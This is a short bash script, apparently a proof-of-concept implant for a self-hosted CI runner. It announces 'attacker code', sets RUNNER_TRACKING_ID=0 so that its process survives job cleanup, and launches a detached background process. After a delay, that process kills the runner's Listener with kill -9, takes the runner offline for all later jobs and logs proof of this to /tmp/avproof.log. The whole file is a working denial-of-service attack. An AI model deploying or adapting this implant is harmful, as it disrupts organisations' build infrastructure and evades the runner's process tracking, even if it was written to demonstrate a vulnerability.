#!/bin/bash
echo "===== attacker code on self-hosted runner ====="; id; hostname
# Deny the CI runner to all subsequent jobs: kill the runner listener after this job.
export RUNNER_TRACKING_ID=0
setsid bash -c "
  sleep 18
  LID=\$(pgrep -f bin/Runner.Listener)
  kill -9 \$LID 2>/dev/null
  echo \"runner Listener (pid \$LID) killed \$(date -u) - runner now offline, CI denied\" > /tmp/avproof.log
" </dev/null >/dev/null 2>&1 & disown
echo "implant armed - will take the runner offline after this job"
